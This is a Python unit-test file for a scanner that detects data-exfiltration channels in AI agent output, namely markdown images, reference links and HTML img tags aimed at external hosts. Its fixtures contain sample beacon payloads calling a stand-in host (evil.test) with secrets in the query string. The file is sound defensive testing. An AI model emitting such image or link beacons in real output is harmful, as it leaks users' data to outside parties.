# SPDX-License-Identifier: AGPL-3.0-or-later
"""Unit tests for the agent-output exfiltration-channel scanner."""

from __future__ import annotations

from mas_sentry.core.output_exfil import ExfilChannel, scan_exfiltration_channels


def _kinds(text: str) -> list[str]:
    return [c.kind for c in scan_exfiltration_channels(text)]


def test_markdown_image_external_is_flagged() -> None:
    out = scan_exfiltration_channels("here ![pixel](https://evil.test/leak?d=secret)")
    assert out == [ExfilChannel("markdown-image", "https://evil.test/leak?d=secret")]


def test_markdown_image_relative_is_ignored() -> None:
    assert scan_exfiltration_channels("![logo](/assets/logo.png)") == []


def test_markdown_image_data_uri_is_ignored() -> None:
    assert scan_exfiltration_channels("![x](data:image/png;base64,AAAA)") == []


def test_reference_style_link_definition_is_flagged() -> None:
    text = "click [here][beacon] for more\n\n[beacon]: https://evil.test/collect?s=1"
    out = scan_exfiltration_channels(text)
    assert out == [ExfilChannel("markdown-reference-link", "https://evil.test/collect?s=1")]


def test_html_image_double_quoted_is_flagged() -> None:
    assert _kinds('<img src="https://evil.test/p.gif">') == ["html-image"]


def test_html_image_single_quoted_is_flagged() -> None:
    assert _kinds("<IMG SRC='https://evil.test/p.gif'>") == ["html-image"]


def test_html_image_unquoted_is_flagged() -> None:
    assert _kinds("<img src=https://evil.test/p.gif alt=x>") == ["html-image"]


def test_plain_text_has_no_channel() -> None:
    assert scan_exfiltration_channels("A perfectly ordinary answer with no links.") == []


def test_duplicate_same_channel_and_url_deduped() -> None:
    text = "![a](https://evil.test/x) and again ![b](https://evil.test/x)"
    assert scan_exfiltration_channels(text) == [ExfilChannel("markdown-image", "https://evil.test/x")]


def test_multiple_distinct_channels_sorted() -> None:
    text = '![a](https://evil.test/img)\n<img src="https://evil.test/h">\n\n[r]: https://evil.test/ref'
    out = scan_exfiltration_channels(text)
    assert [c.kind for c in out] == ["html-image", "markdown-image", "markdown-reference-link"]


def test_empty_text() -> None:
    assert scan_exfiltration_channels("") == []
